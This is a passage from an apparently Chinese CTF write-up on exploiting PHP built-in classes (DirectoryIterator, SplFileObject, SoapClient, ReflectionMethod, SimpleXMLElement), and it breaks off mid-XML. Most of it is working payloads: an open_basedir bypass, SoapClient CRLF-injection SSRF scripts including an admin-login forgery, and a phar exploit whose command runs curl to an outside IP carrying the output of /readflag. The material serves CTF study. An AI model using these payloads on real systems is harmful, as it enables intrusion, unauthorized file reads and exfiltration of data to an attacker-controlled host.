class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;</code></pre><p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="img"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p><pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)</code></pre><p>这样实际上是不影响语句的执行</p><h1 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">版本：php5、php7、php8Filesystemlterator版本：PHP 5 &gt;= 5.3.0, PHP 7, PHP 8</code></pre><pre><code class="php">&lt;?php highlight_file(__file__); $dir=$_GET[&#39;cmd&#39;]; $a=new DirectoryIterator($dir); foreach($a as $f)&#123;     echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;);      &#125; ?&gt; </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="img"><br> 查看该类，发现__toString()方法<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="img"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p><h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。<br>该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="img"><br>遍历一下</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;foreach($dir as $tmp)&#123;    echo($tmp.&#39;&lt;br&gt;&#39;);    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="img"></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="img"></p><pre><code class="php">    &lt;?php    $dir=new SplFileObject(&quot;flag.php&quot;);    echo $dir;    ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="img"><br> 对文件中的每一行内容进行遍历：  </p><pre><code class="php">&lt;?php$dir = new SplFileObject(&quot;flag.php&quot;);foreach($dir as $tmp)&#123;    echo ($tmp.&#39;&lt;br&gt;&#39;);&#125;?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="img"><br>出题的时候如果看到形如:</p><pre><code class="php">    echo new $this-&gt;key($this-&gt;value);      $this -&gt; a = new $this-&gt;key($this-&gt;value);    echo $this-&gt;a;</code></pre><p> 只需要让**$this-&gt;key<strong>值赋为我们想用原生函数，</strong>$this-&gt;value**赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的一个文件。  </p><pre><code class="php">&lt;?phpclass HY&#123;    public $a;    public $b;&#125;$c = new HY();$c-&gt;a=&quot;SplFileObject&quot;;$c-&gt;b=&quot;flag.php&quot;;echo new $c-&gt;a($c-&gt;b);?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="img"></p><h1 id="突破open-basedir的限制"><a href="#突破open-basedir的限制" class="headerlink" title="突破open_basedir的限制"></a>突破open_basedir的限制</h1><p> ctfshow web74  </p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0); // 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;    $c=$_POST[&#39;c&#39;];    eval($c);    $s=ob_get_contents();    ob_end_clean();    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__); &#125; ?&gt;?&gt;</code></pre><p>首先介绍一下ob_get_contents()和ob_end_clean这两个函数。<br>缓冲区(Buffer)就是在内存中预留指定大小的存储空间用来对I/O的数据做临时存储，这部分预留的内存空间叫缓冲区。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>ob_get_contents:返回输出缓冲区的内容，只是得到缓冲区的内容，但不清除它。<br>ob_end_clean:清空（擦除）缓冲区并关闭输出缓冲。<br>eval执行我们的命令后，输出flag内容，但是输出要经过缓冲区，对输出数据进行缓存，通过ob_get_contents() 原来的数据赋值给了$s，然后又用ob_end_clean将缓冲区清空了，那么eval就没办法输出了（缓冲区都被清空了），所以就只有$s一个输出了。所以这里可以通过exit()或者die() （exit别名）退出，这样的话就没有ob_end_clean这个缓冲区清空操作，输出就能正常输出。<br><strong>构造payload:</strong></p><pre><code class="php">c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>然后读取文件</p><pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();</code></pre><h1 id="利用SoapClient类进行CRLF-SSRF"><a href="#利用SoapClient类进行CRLF-SSRF" class="headerlink" title="利用SoapClient类进行CRLF+SSRF"></a>利用SoapClient类进行CRLF+SSRF</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p><pre><code class="php">SoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p><pre><code class="php">函数形式：    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])第一个参数为指明是否为wsdl模式，为null则为非wsdl模式wsdl，就是一个xml格式的文档，用于描述Web Server的定义第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间</code></pre><p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p><p>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agent同样可以注入CRLF，控制Content-Type的值</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299243252-81156156-b050-4637-bea8-54bd0d302863-166888019827967.png" alt="img"></p><p>如上，使用SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p><h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="img"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1/index.php?action=login&#39;;$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo bin2hex($aaa);?&gt;</code></pre><p> 再使用上面的PHPSESSID访问，就是admin了  </p><h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png" alt="img"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p><pre><code class="php">&lt;?phpclass File&#123;    public $file_name;    public $func = &quot;SoapClient&quot;;    function __construct($file_name)&#123;        $this-&gt;file_name = $file_name;    &#125;&#125;$target = &#39;http://127.0.0.1/admin.php&#39;;$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,);$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //设置stub$o = new File($f);$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>详细过程可查看:<a href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> 《web刷题》</p><h1 id="利用ReflectionMethod读取User类的方法"><a href="#利用ReflectionMethod读取User类的方法" class="headerlink" title="利用ReflectionMethod读取User类的方法"></a>利用ReflectionMethod读取User类的方法</h1><h2 id="ReflectionMethod类"><a href="#ReflectionMethod类" class="headerlink" title="ReflectionMethod类"></a>ReflectionMethod类</h2><p>ReflectionMethod的类报告了方法的相关信息<br>版本：(PHP 5, PHP 7, PHP 8)</p><h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。</code></pre><pre><code>### ReflectionMethod API```php/*ReflectionMethod::__construct — ReflectionMethod 的构造函数ReflectionMethod::export — 输出一个回调方法ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例ReflectionMethod::getModifiers — 获取方法的修饰符ReflectionMethod::getPrototype — 返回方法原型 (如果存在)ReflectionMethod::invoke — InvokeReflectionMethod::invokeArgs — 带参数执行ReflectionMethod::isAbstract — 判断方法是否是抽象方法ReflectionMethod::isConstructor — 判断方法是否是构造方法ReflectionMethod::isDestructor — 判断方法是否是析构方法ReflectionMethod::isFinal — 判断方法是否定义 finalReflectionMethod::isPrivate — 判断方法是否是私有方法ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)ReflectionMethod::isPublic — 判断方法是否是公开方法ReflectionMethod::isStatic — 判断方法是否是静态方法ReflectionMethod::setAccessible — 设置方法是否访问ReflectionMethod::__toString — 返回反射方法对象的字符串表达*/ReflectionMethod extends ReflectionFunctionAbstract implements Reflector &#123;/* 常量 */const integer IS_STATIC = 1 ;const integer IS_PUBLIC = 256 ;const integer IS_PROTECTED = 512 ;const integer IS_PRIVATE = 1024 ;const integer IS_ABSTRACT = 2 ;const integer IS_FINAL = 4 ;/* 属性 */public $name ;public $class ;/* 方法 */public __construct ( mixed $class , string $name )public static export ( string $class , string $name [, bool $return = false ] ) : stringpublic getClosure ( object $object ) : Closurepublic getDeclaringClass ( ) : ReflectionClasspublic getModifiers ( ) : intpublic getPrototype ( ) : ReflectionMethodpublic invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixedpublic invokeArgs ( object $object , array $args ) : mixedpublic isAbstract ( ) : boolpublic isConstructor ( ) : boolpublic isDestructor ( ) : boolpublic isFinal ( ) : boolpublic isPrivate ( ) : boolpublic isProtected ( ) : boolpublic isPublic ( ) : boolpublic isStatic ( ) : boolpublic setAccessible ( bool $accessible ) : voidpublic __toString ( ) : string/* 继承的方法 */final private ReflectionFunctionAbstract::__clone ( ) : voidpublic ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClasspublic ReflectionFunctionAbstract::getClosureThis ( ) : objectpublic ReflectionFunctionAbstract::getDocComment ( ) : stringpublic ReflectionFunctionAbstract::getEndLine ( ) : intpublic ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtensionpublic ReflectionFunctionAbstract::getExtensionName ( ) : stringpublic ReflectionFunctionAbstract::getFileName ( ) : stringpublic ReflectionFunctionAbstract::getName ( ) : stringpublic ReflectionFunctionAbstract::getNamespaceName ( ) : stringpublic ReflectionFunctionAbstract::getNumberOfParameters ( ) : intpublic ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : intpublic ReflectionFunctionAbstract::getParameters ( ) : arraypublic ReflectionFunctionAbstract::getReturnType ( ) : ReflectionTypepublic ReflectionFunctionAbstract::getShortName ( ) : stringpublic ReflectionFunctionAbstract::getStartLine ( ) : intpublic ReflectionFunctionAbstract::getStaticVariables ( ) : arraypublic ReflectionFunctionAbstract::hasReturnType ( ) : boolpublic ReflectionFunctionAbstract::inNamespace ( ) : boolpublic ReflectionFunctionAbstract::isClosure ( ) : boolpublic ReflectionFunctionAbstract::isDeprecated ( ) : boolpublic ReflectionFunctionAbstract::isGenerator ( ) : boolpublic ReflectionFunctionAbstract::isInternal ( ) : boolpublic ReflectionFunctionAbstract::isUserDefined ( ) : boolpublic ReflectionFunctionAbstract::isVariadic ( ) : boolpublic ReflectionFunctionAbstract::returnsReference ( ) : boolabstract public ReflectionFunctionAbstract::__toString ( ) : void&#125;</code></pre><h2 id="第十四届全国信息安全竞赛-easy-resource"><a href="#第十四届全国信息安全竞赛-easy-resource" class="headerlink" title="[第十四届全国信息安全竞赛]easy_resource"></a>[第十四届全国信息安全竞赛]easy_resource</h2><p><strong>目录扫描可获得源码:</strong></p><pre><code class="php">&lt;?phpclass User&#123;    private static $c = 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>可利用原生的反射类进行读取，题目说在看不到的地方，猜测是在注释的地方<br>可构造payload:</p><pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></pre><p>翻译一下就是:</p><pre><code class="php">$method = new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment); //getDocComment获取文档注释</code></pre><p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="img"></p><h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p> SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。  </p><h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="img"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="img"></p><pre><code class="php">&lt;?php class calc&#123;    function __construct__()&#123;        calc();    &#125;    function calc($args1,$method,$args2)&#123;        $args1=intval($args1);        $args2=intval($args2);        switch ($method) &#123;            case &#39;a&#39;:                $method=&quot;+&quot;;                break;            case &#39;b&#39;:                $method=&quot;-&quot;;                break;            case &#39;c&#39;:                $method=&quot;*&quot;;                break;            case &#39;d&#39;:                $method=&quot;/&quot;;                break;                        default:                die(&quot;invalid input&quot;);        &#125;        $Expression=$args1.$method.$args2;        eval(&quot;\$r=$Expression;&quot;);        die(&quot;Calculation results:&quot;.$r);    &#125;&#125;?&gt;        </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="img"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM 